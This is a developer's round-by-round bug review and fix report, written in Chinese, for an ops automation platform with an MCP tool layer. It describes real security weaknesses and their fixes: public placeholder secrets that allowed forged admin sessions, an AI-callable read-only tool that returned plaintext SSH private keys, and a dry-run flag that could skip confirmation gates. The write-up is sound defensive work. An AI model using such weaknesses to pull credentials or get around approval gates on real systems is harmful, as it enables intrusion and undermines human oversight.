# OPS 平台复盘与修复报告

> 目标：完整复盘 `ops-ai`（FastAPI 后端 + React 前端 + MCP 工具层 + Matrix/OpenClaw 集成）
> 的功能逻辑实现情况，系统排查并修复真实 BUG；每批修复含回归测试 + 全量套件 + 提交推送。
> 本文件按轮次累积记录：**已修 / 已排除（假问题） / 待办**。

测试基线：全量套件 `pytest tests/ -q`。

---

## 第 1 轮（2026-09-12）

套件基线 1281 → 本轮结束 **1327 passed**（新增回归 40 项）。

### 一、已修复

#### 批次 1（commit `e4563dc`）安全：公开占位密钥被判定为"正常"
- **问题**：`.env` 的 `SESSION_SECRET`（指纹 `db1978f13bb1`）与 `OPS_SECRET_KEY`
  （指纹 `e1f8c2eb78f1`）与仓库内 `.env.example` 的公开值**逐字节相同**。
  - `SESSION_SECRET` 是会话 cookie 的 HMAC 签名密钥 → 可离线伪造管理员会话
    （已实测：用该密钥签发的 token 被线上 OPS 接受并返回 200）；
  - `OPS_SECRET_KEY` 是库内凭据（服务器口令/私钥、数据库连接）的 Fernet 加密口令，
    且 `_normalize_fernet_key` 用 sha256 由口令派生，公开口令 = 公开密钥；
  - 而 `diagnostics` / `system_health` / `recommendations` / `preflight` / `doctor` /
    `check_env` 六个入口都只校验"是否配置 + 长度"，全部报告正常。
- **修复**：
  - 新增 `app/core/secrets_policy.py`：统一状态机 `missing/insecure/weak/ok`，
    覆盖占位值、示例值、弱口令（长度 < 32 或字符种类 < 8），生产环境 fail-closed；
  - `diagnostics` / `system_health` 报 `error`（总体 `unhealthy`），
    `recommendations` 产出 high 级「轮换密钥」建议并给出命令；
  - `preflight` / `doctor` / `check_env.ps1|sh` 同步策略（本地环境仅 WARN，
    不阻塞 `start_single_process.ps1` 启动）；
  - 4 个示例 env 文件的密钥值清空并加安全注释；
  - 新增 `scripts/rotate_secrets.py`（`--check` / `--rotate-session-secret` /
    `--rotate-ops-key` / `--encrypt-plaintext`，默认 dry-run，需 `--apply`，
    轮换前先验证旧密钥可解密、自动备份 `.env` 与数据库、单事务重加密并回读验证）。
- **现状**：库内加密凭据 0 行（`servers.password` 0/78、`jump_hosts` 0/2、
  `database_connections` 空、`ssh_keys` 0）→ 轮换零风险；按业主答复
  「本地运行 暂无风险」**未执行轮换**，仅保留告警（系统状态页显示不健康 +
  高风险建议），随时可一条命令轮换。

#### 批次 2（commit `8342874`）口径：被 limit 截断的条数被当成"总数"
- **问题**：`_filter_items` 内部已按 limit 截断，调用方仍用 `len(items)` 当 total 与
  「查询到 N 台/个」；`audit_chain.list_operation_chains` 的 `total = len(items[:limit])`
  且 5 个数据源查询各自带 `.limit(limit)`（limit=50 时总数永远显示 50）；
  `report_center` 的 `operation_chains_index` 报表同样取截断后的 `len(items)`。
- **修复**：`_filter_items` 返回 `(page, true_total)` + `_truncation_note` 显式说明
  「仅返回前 N 条」；新增 `_count_operation_chains()` 用 SQL count 统计真实总数
  （status/risk 过滤与内存 `keep()` 等价，含部署派生风险 high/medium）；
  报表改取数据源 total，并新增 `returned` / `truncated`。
- **线上验证**：`/api/v2/audit/operation-chains` 修复前 total ≤ 50 →
  现 `total=1260`，各来源与库内逐项一致（tool_call 407 / job 797 / plan 1 /
  execution_plan 54 / deployment 1）。

#### 批次 3（commit `6c8aa67`）审计列表窗口截断 + 列表 ETag 失效
- **问题**：`/api/v2/audit` 与 `/audit/export` 先 `load_audit_logs(5000)` 取最新 5000 条
  到内存，再过滤 action、按 offset 切页、`total = len(rows)`。后果：
  ① 超过 5000 条后 total 永远显示 5000；② 更早的记录 offset 翻页不可达；
  ③ 检索较久远才出现的 action 静默返回空列表；④ 导出 CSV 只在这 5000 条里过滤，静默丢数据。
- **修复**：新增 `app/config/audit.py::list_audit_records()`，过滤（大小写不敏感子串 +
  LIKE 通配符转义）、`since_id`、`count` 与分页全部下推 SQL；limit 仍钳 1000；
  导出上限 5000 行不变但**过滤先于截断**，并回传 `X-Total-Count`/`X-Exported-Count`。
- **修复**：`app/api/helpers.py::compute_list_etag` 对 dict 条目用
  `getattr(item, "id", id(item))` → 退化为内存地址，同一份数据每次 ETag 都不同，
  `If-None-Match` 永不命中、304 短路实际失效（审计/工具调用/令牌/报表列表都传 dict）→
  新增 `_etag_identity()` 用 id/chain_id/key/name + 时间戳。
- **线上验证**：`total=620`（== 库内真实 620）；两次请求 ETag 一致；
  带 `If-None-Match` → **HTTP 304**；不存在的 action → 0/0；翻页正常。

#### 批次 4（commit `6c8aa67`）审计/作业写入失败被静默吞掉
- **问题**：`audit_writer` 队列满时的同步兜底写入失败、关停排空失败都是 `except: pass`，
  且 `db = SessionLocal()` 写在 `try` 之外 —— DB 不可用时异常正好落到这两个 pass，
  审计记录**静默丢失且日志无痕**；`job_service` 作业失败时
  `_set_job_status(status="failed")` 抛错被吞 → 作业永久停在 running 且无日志。
- **修复**：状态/审计类写入失败一律 `logger.exception`（含 job_id / audit_id / 工具名），
  并用 `db=None` 守卫保证连接关闭；清理类失败（`close()`、SSE 推送）保持静默容忍。

### 二、已排除的"假问题"（避免误修）
| 现象 | 结论 |
| --- | --- |
| `/tools/calls?limit=100000` 返回 407 条 | 服务层已钳制 500，属正常（探针阈值过激） |
| `/audit` limit=100000 返回 616 条 | 端点已钳 1000，属正常 |
| `/tasks` 500 条、`/system/recent-errors` 200 条 | 均有钳制（500 / 200） |
| `risk_policy.py` 的 `except: pass` | 确认短语派生失败时回退到**更严格**的通用短语 = 失败关闭 |
| `ops.approval.execute` 声明 `risk=low/write=False/confirm=False` | 有意设计：闸门是一次性确认短语（15 分钟过期、绑定房间+事件+内容指纹）+ 生产第 4 层从句，工具描述已注明 |
| MCP 工具元数据检查 B 类（write 且可 AI 自动调用、无需确认/审批） | 0 项 |
| 高敏感数据未开输出脱敏 | 0 项 |
| `deploy/_shared.py`、`ssh_service.py` 等 `except: pass` | 均为 `close()` / SSE 推送等 best-effort 清理 |

### 三、待办（后续轮次）
- **API 前后端契约**：参数被静默忽略、筛选/分页失效类（已建立静态+运行时探针脚本）。
- **巡检域**：状态机、时间窗、幂等、口径一致性（`inspection_center.py` 5600+ 行）。
- **MCP 工具层**：输出脱敏与泄漏面（`data_sensitivity` × `output_masking` × 实际返回体）、
  审批旁路、元数据与实现一致性。
- **前端**：竞态/请求序号、陈旧 state、契约不匹配、假交互（无实际效果的按钮）。
- **部署/执行/维护链路**：确认闸门、回滚一致性、命令注入与白名单。
- **遗留（功能向，非 BUG）**：`ENV=local` 关闭生产安全轨、OpenClaw `<thinking>` 原文下发、
  NAS 自动启动、`pm2 list` 白名单、`bg_log_dir`。

---

### 附：第 1 轮可复现的验证脚本（`fnos-migration/`，未入库）
- `_audit_tool_risk.py`：MCP 工具风险声明 vs 副作用一致性检查；
- `_probe_pagination2.py`：逐端点验证 limit 钳制与 total 返回（进程内路由表，docs 已关闭）；
- `_verify_audit_api.py`：审计列表 total/ETag/304 线上验证；
- `_verify_chains_api.py`：操作链路 total 与库内逐来源一致性验证。

---

## 第 2 轮（2026-09-12）

套件基线 1327 → 本轮结束 **1336 passed**（新增回归 9 项：后端 5 + 前端契约 4）。

### 一、已修复

#### 批次 5 时间基：审计时间戳写的是服务器本地时间，与全系统 UTC 错位 8 小时
- **问题**：`app/config/audit.py::save_audit_log` 用 `datetime.now()`（服务器本地时间）
  写 `audit_records.created_at`，而系统内其余写入（`app/db/models.py::_utcnow` 及 69 处调用）
  统一是 **naive UTC**。生产机时区为 `China Standard Time`（UTC+8）。
- **实测取证**（同一时刻）：
  - 本地 `2026-09-12T21:41:20` / UTC `2026-09-12T13:41:20`，此时新写一条审计记录得到
    `audit_records.created_at = 2026-09-12T21:41:21`（本地时间）；
  - 库内 `audit_records` 最新值 `2026-09-12T21:34:30` vs `tool_call_logs` 最新值
    `2026-09-12 11:40:20` —— 同一时间段两类记录相差 8 小时；
  - 线上唯一写入路径：`app/api/helpers.py:125` 与 `app/services/runtime_resources.py:483`
    都是 `from config_manager import save_audit_log`，而 `config_manager` 只是再导出
    `app.config.audit.save_audit_log`；`app/db/repository.py::save_audit_log`（写法正确、UTC）
    **无调用者**，属死代码。
- **影响**：① 审计页时间比工具调用/任务页"晚 8 小时"（同一操作在两个页面显示不同时间）；
  ② 审计链路把审计记录与工具调用/作业合并按 `created_at` 排序 → 跨源时间线错位 ±8h；
  ③ 前端按日期过滤的边界偏移（取字符串前 10 位得到的是另一种时基的日期）；
  ④ `cleanup_audit_logs` 若继续用本地截止点会多删 8 小时的记录。
- **修复（后端）**：
  - 新增 `app/config/audit.py::utcnow_naive()`（= `datetime.now(timezone.utc).replace(tzinfo=None)`），
    写入端与 `cleanup_audit_logs` 的截止点统一走它（两者必须同一时基，否则清理会多删）；
  - 新增 `scripts/fix_audit_timezone.py`：一次性回迁历史数据（`--check` 只读体检 /
    `--apply` 先整库备份再迁移 / 同事务回读校验 / 解析失败单独列出，可回滚）。
- **历史数据迁移（已执行）**：628 行全部可解析 → 统一 -8h，迁移后
  最小/最大 `2026-09-04T02:08:10` / `2026-09-12T13:41:21`（= UTC）；
  备份 `data/ops.db.bak-tz-20260912-214321`。
- **修复（前端）**：浏览器把 naive 串当**本地时间**解析，于是所有展示库内时间戳的页面
  都少显示 8 小时（相对时间把"刚刚"说成"8 小时前"，甘特条整体错位，日期筛选边界偏移）。
  新增 `frontend/src/utils/datetime.js` + `datetime.d.ts`（仓库既有 JS+`.d.ts` 约定）：
  `parseBackendTime`（naive 补 `Z` 后解析；纯 `HH:MM:SS` 或非法串返回 null 由调用方回退原文）、
  `formatTime` / `formatDateTime` / `formatDay` / `backendTimeValue` / `relativeFromNow`；
  审计、MCP 审计、任务中心、文件中心、巡检、工具令牌/临时授权、工具时间线/详情、
  服务器列表/详情、仪表盘、甘特条、维护任务页共 16 个文件改用统一工具。
- **有意保留（不是 BUG，避免误修）**：
  - 维护清理窗口 `_is_within_execution_window` 用 `datetime.now()` 是**正确**的：
    窗口由操作员按本地时间配置 `HH:MM`，单机部署下本地时间即操作员时间；
  - `sftp.py` 的 `mtime`、备份文件时间用 `datetime.fromtimestamp()` / `time.localtime()`
    生成，本身就是本地时间，前端保持按本地解析；
  - `keys.py` 的 `modified`、`ServerListPage` 的 `modified` 是 epoch 秒；
    `LoginPage` 的 `builtAt` 是带 `Z` 的 `toISOString()` —— 均无需转换；
  - 系统诊断/状态页显示的原始 ISO 串（`snapshot.generated_at`、`backend.started_at`）
    保留原样：该页面本身就是"原始诊断信息"视图。
- **其它写入路径核对**：所有按时间保留/清理的策略**本来就是 UTC**
  （`sqlite_cleanup.py` 用 `datetime.now(timezone.utc)`、`release_retention._now_naive()`、
  `cleanup_stale_chain_data.py` 用 `datetime.utcnow()`），本次修复消除了唯一的例外。

### 二、已排除的"假问题"（避免误修）
| 现象 | 结论 |
| --- | --- |
| `listItemConfigs` 前端传 `scopeType`、后端收 `scope_type` | 误报：包装器内部已正确映射 `{ params: { scope_type: scopeType } }` |
| 参数契约静态审计报出的 37 项 | 绝大多数是解析伪影（`params?: {...}` 内联类型、POST body 字段、同路径多方法互相覆盖）；可静态比对的 GET 包装器中**真问题 0 项** |
| 前端 `npm run typecheck` | 干净通过（0 错误），无契约不匹配 |
| 维护清理窗口用本地时间 | 有意设计（见上） |

### 三、待办（后续轮次）
- **巡检域**：状态机、时间窗、幂等、口径一致性（`inspection_center.py` 5600+ 行）。
- **MCP 工具层**：输出脱敏与泄漏面（`data_sensitivity` × `output_masking` × 实际返回体）、
  审批旁路、元数据与实现一致性。
- **前端**：竞态/请求序号、陈旧 state、假交互（无实际效果的按钮）、剩余时间显示点复检。
- **部署/执行/维护链路**：确认闸门、回滚一致性、命令注入与白名单。
- **`except: pass` 剩余点**：142 处中清理类之外的静默失败。
- **遗留（功能向，非 BUG）**：`ENV=local` 关闭生产安全轨、OpenClaw `<thinking>` 原文下发、
  NAS 自动启动、`pm2 list` 白名单、`bg_log_dir`、密钥轮换（等业主决定）。

### 附：第 2 轮可复现的验证脚本（`fnos-migration/`，未入库）
- `_audit_param_contract2.py`：前端声明的查询参数 vs 后端路由实际接收参数（进程内路由表）；
- `_audit_fe_be_params.py` / `_audit_param_contract.py`：上述脚本的早期版本（含解析伪影，仅存证）；
- 迁移与体检：`scripts/fix_audit_timezone.py --check`（只读）。

## 第 3 轮（2026-09-12）

> 主题：**凭据写入安全** —— 排查"空值/脱敏占位符被当成真实密钥写库"这一类会**破坏真实数据**
> 的缺陷（改描述顺手清空私钥 / 把 `********` 存成私钥）。

### 一、已修复

#### 3.1 【严重】编辑数据库连接会静默清空已保存的 SSH 凭据
- **现象**：`PUT /api/v2/maintenance/connections/{id}` 保存任意改动（哪怕只改描述）后，该连接
  已上传的 SSH 私钥内容、SSH 口令/口令短语、二级跳板机口令全部被清空；列表里
  `ssh_key_has_content` 由真变假，走 SSH 隧道的 DB 巡检与 SQL 查询随即连不上。
- **根因**（三层叠加）：
  1. `app/api/maintenance.py::update_connection` 传 `body.model_dump()`（**全量**字典，未用
     `exclude_unset=True`），把客户端没提交的 `ssh_key_content` 补成 `None`；
  2. `app/maintenance/service.py::update_connection` 对密钥字段是"字段在 payload 里就覆盖"
     （`encrypt_secret(v) if v else None`），空值即清空；
  3. 前端 `useCleanupJobActions.ts:101` 明确 `delete payload.ssh_key_content`（有意不动已上传私钥），
     却因后端全量补 `None` 而失效；`ConnectionsTab.tsx` 又把 `ssh_password`/`ssh_key_passphrase`/
     `ssh_target_password` 初始化为 `''` 并随 `...connForm` 提交，而 `GET /connections/{id}`
     **从不返回**这些值（只返回 `ssh_key_has_content` 布尔位），所以清空后前端无法回填、无从恢复。
  - 佐证这是遗漏而非设计：同一处 `password` 字段**本来就有**"空值不覆盖"保护
    （`if "password" in data and data.get("password")`），其余密钥字段没有。
- **修复**：
  - `CleanupService.update_connection` 统一密钥字段三态语义：**缺省=保持；空串/掩码=保持；
    显式 JSON `null`=清空；非空=覆盖**（清空已上传私钥另有 `DELETE /connections/{id}/ssh-key` 专用端点）；
  - `app/api/maintenance.py` 改用 `body.model_dump(exclude_unset=True)`；
  - `CleanupService.create_connection` 同样把掩码视为"未提供"。
- **回归测试**：`tests/test_connection_secret_preservation.py`。修复前两项失败并精确报出
  `ssh_password_encrypted 被清空（应为保留）`，修复后 11 项全绿。

#### 3.2 【中】服务器"创建"接口会把脱敏占位符当真实密钥入库
- **现象**：`POST /api/v2/servers` 提交 `key_content="********"`（GET 返回的掩码被脚本/Agent/
  克隆流程回填）会被当作真实私钥存库，该服务器从此无法用密钥登录，且原私钥无从恢复。
- **根因**：创建路径只判真值、不识别掩码，而**更新**路径专门处理了
  （`incoming not in (None, "", "********")`）—— 同一语义两处实现不一致。
- **修复**：`app/config/servers.py` 新增共享哨兵与工具
  （`REDACTED_SECRET`、`is_redacted_secret`、`is_blank_or_redacted_secret`、`blank_redacted_secrets`）；
  创建路径先 `blank_redacted_secrets(data)`（含内联跳板机配置），掩码即"未提供"，由认证校验给出明确 400；
  更新路径改用同一 helper，消除字面量漂移。
  掩码识别放宽为"3 个及以上星号"：HTTP 层用 8 星，MCP 工具层用 3 星（`tool_adapters/connection_tools.py:7`
  `_MASK = "***"`），而真实口令/私钥不可能是"纯星号"字符串。
- **可达性**：当前前端**无法触发**（`openEdit` 预填掩码后走 update 分支；列表接口不返回
  `key_content`/`password`，创建表单初始为空）。属**接口级防御**，防止脚本/Agent/后续 UI 改版踩坑。
- **回归测试**：同文件 `test_server_create_rejects_redacted_*`（掩码不落库、报 400）、
  `test_server_create_keeps_real_secret`（真实密钥不受影响）、
  `test_server_update_treats_mask_as_unchanged`（掩码=保持）、
  `test_blank_redacted_secrets_covers_top_level_and_inline_jump_host`。

#### 3.3 【中】数据库连接的创建/修改/删除与 SSH 私钥上传**完全无审计**
- **现象**：`audit_records` 中**查不到任何连接相关记录**（`action like '%connection%'` 命中 0 条），
  而这些连接里保存的正是生产库口令与 SSH 私钥。审计保留窗口仅约 8 天（当前最早记录 2026-09-04），
  "凭据被谁在何时改动/清空"事后无从追溯 —— 3.1 那类清空事故即便再次发生也无迹可寻。
- **根因**：`app/api/maintenance.py` 的 `create_connection` / `update_connection` / `delete_connection` /
  `upload_ssh_key` / `delete_ssh_key` 均无 `audit(...)` 调用，而同文件的 `sql.query.execute`、
  `sql.saved.*`、`log_retention_execute` 都有；`app/core/security.py` 的全局 HTTP 中间件也不做请求级审计。
- **修复**：上述 5 个端点补审计（`maintenance.connection.create/update/delete`、
  `maintenance.connection.ssh_key.upload/delete`）；更新时额外记录**密钥布尔位变化**
  （`secrets_changed=ssh_key_content_encrypted:1->0`）—— 只记存在性与字节数，绝不记密钥本身。
- **回归测试**：`test_update_connection_endpoint_preserves_secrets`（审计为 `secrets_changed=none`
  且详情不含任何密钥明文）、`test_update_connection_explicit_null_clears_and_is_detected_in_audit`
  （显式清空后审计可见 `ssh_key_content_encrypted:1->0`）。

### 二、已排除的"假问题"（避免误修）
| 现象 | 结论 |
| --- | --- |
| 服务器**更新**路径"掩码=保持原密钥" | 正确行为，非 BUG（本轮补测试锁定） |
| `PUT /api/v2/servers/batch` 批量改 | 只接受非密钥字段且以 `existing` 为基线逐字段改，部分更新安全 |
| 内联跳板机配置（`metadata_json.inline_jump_host`）泄漏凭据 | 实测 78 台服务器中 71 台有该配置，字段仅 `name/host/port/username/key`，**0 台**含 `password`/`key_content`；浏览器用的 `list_server_assets()` 只取 `jump_host` **名称列**，不返回内联字典 |
| 连接详情接口泄漏 DB/SSH 口令 | `GET /connections/{id}` 只返回 `ssh_key_has_content` 布尔位，无 `password`/`key_content` 字段 |
| 生产库 20 个连接全部 `password_encrypted` 为空 | 19 个是 2026-06-04 01:54:50 批量导入（`updated_at == created_at`，未启隧道）；唯一启用隧道的 `印度-ind` 用 `ssh_mode=server` 从服务器记录取密钥 —— 非 3.1 BUG 造成的历史损坏 |
| `cleanup_*` 保留策略按本地时间 | 误报：`release_retention._now_naive()`、`sqlite_cleanup` 本来就是 UTC |
| `security_daily.report_date` 用本地日期 | 有意设计（业务日期同时用于远端日报文件名与 `filter_by(report_date=...)`） |
| MCP 能力清单里的 `ops.update_connection`（声明"高风险需审批"） | **该工具并未注册**（126 个已注册工具中不存在），且它引用的 `"***"` 掩码与 HTTP 层 `"********"` 不一致：属元数据漂移（见待办），当前不构成可用写入路径 |

### 三、待办（后续轮次）
- `mcp_capability_service.py` 声明的能力 vs `tool_registry` 实际注册工具的**一致性核对**
  （如 `ops.update_connection` 只声明未注册；反向也要查"注册了但未声明"）。
- 批量改 `auth_type` 时不校验新认证方式的凭据（目前会在使用时得到明确 400 提示，是否需前端前置校验待定）。
- 保留第 2 轮清单：巡检域状态机/时间窗/幂等、MCP 输出脱敏与审批旁路、前端竞态与假交互、
  部署/执行/维护链路确认闸门与回滚一致性、剩余 `except: pass` 静默失败、
  遗留功能项（`ENV=local` 关闭生产安全轨、OpenClaw `<thinking>` 原文下发、NAS 自动启动、
  `pm2 list` 白名单、`bg_log_dir`、密钥轮换待业主决定）。

### 附：第 3 轮可复现的验证脚本
- `tests/test_connection_secret_preservation.py`：12 项凭据写入安全回归（服务层 + 接口层 + helper 层 + 审计）；
- `fnos-migration/_verify_connection_secret_fix.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测
  （建临时连接 → 前端形状更新 → 显式清空 → 删除），18 项断言全部 OK；
- `fnos-migration/_verify_credential_write_safety.py`（未入库，只读）：扫描内联跳板机配置是否携带
  口令/私钥，并列出各连接"已保存密钥"的布尔状态，便于修复前后对比。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 36876）
| 实测项 | 结果 |
| --- | --- |
| 建临时连接（含 DB 口令/SSH 口令/私钥内容）后 `GET` 详情 | `ssh_key_has_content=true`；详情**不含** `password`/`ssh_key_content` 字段 |
| 按前端真实形状 `PUT`（`ssh_password=''`、无 `ssh_key_content`，只改描述） | HTTP 200；DB 中 6 个 `*_encrypted` 列**全部保留**，`description` 已更新 |
| 再 `GET` 详情 | `ssh_key_has_content` **仍为 true**（修复前会变 false） |
| `PUT` 显式 `ssh_key_content=null` | 私钥按预期清空，其它密钥不受影响（"有意清空"能力未被堵死） |
| 审计 `maintenance.connection.*` | 产生记录且只含布尔位：`secrets_changed=none`、`secrets_changed=ssh_key_content_encrypted:1->0`，**无任何密钥明文** |
| 服务器掩码创建 | `key_content="********"` → 400「密钥内容认证模式下必须提供密钥内容」，库中 **0 条**；`password="********"` → 400 |
| 服务器真实密钥创建 | HTTP 200，响应回显已脱敏为 `********`（`has_key_content=true`），已清理删除 |
| 临时数据 | 临时连接/服务器均已删除，库内残留 **0** |

> 运维提示：`PUT /api/v2/maintenance/connections/{id}` 接收的是**全量** `ConnectionCreate`
> （缺少 name/environment/host/username 会 422），因此"有意清空某密钥"需提交完整对象并把该字段置 `null`；
> 前端表单只提交自己管理的字段 + 空串，语义为"保持原值"。

## 第 4 轮（2026-09-12）

本轮范围：**MCP 工具层**——能力清单与注册表一致性、输出脱敏声明、审批/确认闸门、
`dry_run`（预览）语义。核心问题是"声明与实现不一致"：工具对外宣称的行为与实际行为不符，
调用方（尤其是 AI 客户端）无法察觉。

### 一、已修复

#### 4.1 【高危】`ops.get_ssh_key` 回传明文 SSH 私钥，且描述声称"不含私钥内容"

- **现象**：`app/services/tool_adapters/ssh_key_tools.py` 的 `ops.get_ssh_key` 直接把
  `decrypt_secret(row.private_key_encrypted)` 放进返回值。该工具：

  | 属性 | 值 | 问题 |
  | --- | --- | --- |
  | `scopes` | `["ops:read"]` | 只要基础只读作用域 |
  | `risk` / `write` | `low` / `False` | 无确认、无审批闸门 |
  | `data_sensitivity` / `output_masking` | `sensitive` / 默认 `True` | 声明要脱敏，实际未脱敏 |
  | 档位 | 同时在 `DAILY_OPS_TOOL_NAMES` 与默认 `ai_full` | AI 客户端可见可调 |
  | MCP 描述 | "Get SSH key metadata (no private key content)" | **与实现完全相反** |

- **影响**：任何持 `ops:read` 的 AI/MCP 令牌可一次性取走**全部已注册 SSH 私钥**，
  进而直连整个机群，**绕开部署/执行通道的全部人工审批设计**；私钥同时被写入模型上下文。
  全仓 `decrypt_secret` 调用点中，只有这一处把明文交回给工具调用方
  （其余在 `db/repository.py`、`maintenance/service.py`、`maintenance/sql_query.py` 内部，
  用于真正建立 SSH/DB 连接）。
- **现场事实**：线上当前 `ssh_keys` 共 **0** 把，故未造成实际泄漏；但代码路径一旦注册密钥
  即可被只读令牌取走（本轮用临时探针密钥复现并验证修复）。
- **修复**：`get_ssh_key_tool` 改为只回传元数据 + **不可逆指纹**（`secret_fingerprint`，12 位），
  私钥字段固定掩码 `"***"`，新增 `has_private_key`；工具描述与 MCP 描述统一为"不回传私钥内容"；
  补齐 `output_masking=True` 声明。无任何 HTTP 接口或前端功能读取该私钥，故无功能损失。
- **回归**：`tests/test_ssh_key_secret_exposure.py`（6 项）——运行期输出扫描（明文标记不得出现
  在返回值里）、指纹稳定性、缺失密钥契约、列表接口仅元数据、**静态守卫**（工具适配器不得在
  `return` 中直接解密密钥）、描述一致性。
- **红灯证据**（临时回退适配器文件后）：
  `AssertionError: 私钥明文不得出现在工具返回值中` /
  `assert 'SUPER-SECRE...-MARKER-4f3a' not in '{"found": t...:26.335755"}'`；修复后同一用例通过。

#### 4.2 【中危】`ops.upload_package` 的 `dry_run` 对 `content_base64` 入参完全失效（会真实落盘）

- **现象**：`app/services/tool_adapters/file_tools.py::upload_package` 只在 `local_path` 分支检查
  `dry_run`；`content_base64` 分支直接 `save_package_base64(...)` 落盘 + 写 `DeployPackage` 元数据。
- **影响**：调用方显式传 `dry_run=true` 却被**真实暂存**进文件中心；风险策略与调用日志又按
  "非破坏性预览"记账（`_is_dry_run` → 跳过确认、置 `can_auto_execute`），
  等于"声称预览、实际写入"，且写入在审计里不可见。
- **修复**：新增 `_inspect_package_content(...)`，对内存内容走同一套保留策略预检
  （扩展名白名单 / 体积上限 / 空包告警 / SHA256），检查完立即删除临时文件；
  返回体显式标注 `dry_run=true`、`staged=false`、`source`；非法 base64 仍按 400 契约返回。
  `local_path` 分支的 dry-run 结果也补齐同样标注。
- **红灯证据**：修复前 `assert None is True`（返回体是真实上传结果
  `{'exists': True, 'deleted': False, ...}`，无 `dry_run` 标注）；且非白名单后缀在 dry-run 下
  直接 `HTTPException: 400: Unsupported package extension: notes.txt`，而不是给出 `blockers` 预检结论。
- **回归**：`tests/test_tool_dry_run_contract.py`（含 4.3、4.4 共 10 项）。

#### 4.3 【中危】`ops.prepare_release_from_local_package` 在 `dry_run + content_base64` 下返回空预检

- **现象**：dry-run 分支只处理 `local_path`，用 `content_base64` 调用时静默返回一份
  `local_inspection={}` 的"dry-run 成功"。
- **影响**：高风险工具（`risk=high`、`requires_confirmation=True`）的 dry-run 会跳过确认，
  而调用方拿到的却是"没有任何预检信息"的成功响应，容易据此误判后进入真实发布。
- **修复**：dry-run 分支把 `content_base64` 一并转交 `upload_package(..., dry_run=True)`，
  返回真实预检结果；仍不落盘、不建计划（回归断言 `ToolPlan` 数量为 0）。

#### 4.4 【加固】`_is_dry_run` 只对**声明了** `dry_run` 的工具生效

- **背景**：`validate_schema` 仅在 schema 声明 `additionalProperties: false` 时拒绝未知参数
  （`app/services/tool_schema.py:23-31`），而任务中心后台执行路径（`job_service.py:268-270`）
  **不经过 schema 校验**；原 `_is_dry_run(args)` 只看调用方是否传了 `dry_run`。
- **风险**：若将来出现"写法不严"的写工具，任何调用方多带一个 `dry_run: true` 就能让
  `confirmation_required` 变 `False`，等于给全部写操作留一个**通用跳确认开关**。
- **修复**：`_is_dry_run(tool_def, args)` 要求工具 `input_schema.properties` 中确实声明 `dry_run`，
  否则不认。既保持两个真正实现预览语义的工具可用，也让闸门不再依赖各工具 schema 的严谨度。
- **回归**：`test_undeclared_dry_run_does_not_skip_confirmation`（要求确认）、
  `test_undeclared_dry_run_still_raises_428`（HTTP 428 `CONFIRMATION_REQUIRED`）、
  `test_declared_dry_run_still_skips_confirmation`（正向对照）、
  `test_real_registry_write_tools_only_allow_declared_dry_run`（注册表级：仅
  `ops.upload_package`、`ops.prepare_release_from_local_package` 声明了 `dry_run`）。

### 二、已排除的"假问题"（本轮审计结论，避免误修）

| 审计项 | 结论 | 证据 |
| --- | --- | --- |
| 高危写工具是否缺人工确认/审批闸门 | **无缺口**：20/20 高危/严重写工具都带 `requires_confirmation` 或 `requires_human_approval` | `fnos-migration/_audit_tool_gates.py`：A 类 0、B 类（声明需确认但风险阈值不生效）0 |
| 写工具是否允许 AI 自动调用 | **无**：28 个写工具中 `ai_auto_callable=True` 为 **0** | 同上 |
| `dry_run` 能否成为通用跳确认开关 | **当前不可利用**：28/28 写工具都声明 `additionalProperties: false`，夹带 `dry_run` 会被 400 拒绝；仅 2 个工具声明 `dry_run` | `fnos-migration/_audit_dry_run_bypass.py`；现场 D2 实测 `400 Unknown tool arguments: dry_run` |
| 是否存在绕过策略的工具执行路径 | **无**：`registry.call`、任务中心 worker、`/tools/packages/upload` 三处都会执行 `enforce_tool_policy` | `tool_registry.py:663`、`job_service.py:268`、`api/tools.py:558` |
| 两个直接建 job 的接口能否夹带参数 | **不能**：`args` 由服务端从类型化 payload 构造，`inspection.py` 还硬编码 `confirm_text` | `api/servers.py:1260-1265`、`api/inspection.py:865-870` |
| `ops.update_connection` 声称"高风险需人工审批"却查不到 | **死元数据**：该工具未注册，`MCP_TOOL_DESCRIPTION_OVERRIDES` 里的描述不会出现在 AI 可见清单，无用户可见影响 | `mcp_capability_service.py:188` vs `registry._tools` |
| `data_sensitivity` / `output_masking` 未被运行时强制 | **设计如此**：二者只做策略分级（`ai_tool_level` → L2）与清单声明，脱敏由各适配器自行实现；本轮逐点核对了密钥类输出 | `tool_policy.py:91/186`、各适配器 `_MASK` |
| 工具调用日志会保存密钥明文 | **不会**：`tool_audit._preview` 按字段名正则脱敏（含 `private_key`/`password`/`token`） | 现场实测日志行为 `"private_key": "***MASKED***"` |

### 三、待办（后续轮次）

- 巡检域（`inspection_center.py` 5600+ 行）状态机、幂等与时间窗语义核查（尚未开始）。
- MCP 工具描述里的**正向漂移**批量校准（本轮只修了会误导安全判断的一条）；
  反向"注册了但能力清单未声明"的工具也要补描述。
- 剩余 `except: pass` 静默失败分诊（约 142 处）。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性。
- 保留第 3 轮清单：批量改 `auth_type` 时不校验新认证方式凭据、密钥轮换（待业主决定）、
  `ENV=local` 关闭生产安全轨相关项。

### 附：第 4 轮可复现的验证脚本

- `tests/test_tool_dry_run_contract.py`：10 项 dry-run 契约 + 闸门不变量回归；
- `tests/test_ssh_key_secret_exposure.py`：6 项私钥外泄回归（含静态守卫与描述一致性）；
- `fnos-migration/_audit_tool_gates.py`（未入库，只读）：写工具闸门矩阵（确认标志 / AI 自动调用 / `dry_run` 声明）；
- `fnos-migration/_audit_dry_run_bypass.py`（未入库，只读）：`dry_run` 跳确认可利用性矩阵；
- `fnos-migration/_verify_round4_fixes.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 39044；25 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| 临时播种探针密钥后 `POST /api/v2/tools/call` 调 `ops.get_ssh_key` | HTTP 200；响应**不含** `PRIVATE KEY` 头、不含私钥明文标记、不含口令明文 |
| 同上返回字段 | `private_key="***"`、`has_private_key=true`、`private_key_fingerprint="6535a6e625f5"`（12 位不可逆指纹） |
| 该次调用的 `tool_call_logs.result_preview` | `{"found": true, "name": "round4-probe-key", "private_key": "***MASKED***", ...}` —— **日志无明文** |
| 探针密钥清理 | 删除后库内残留 **0** |
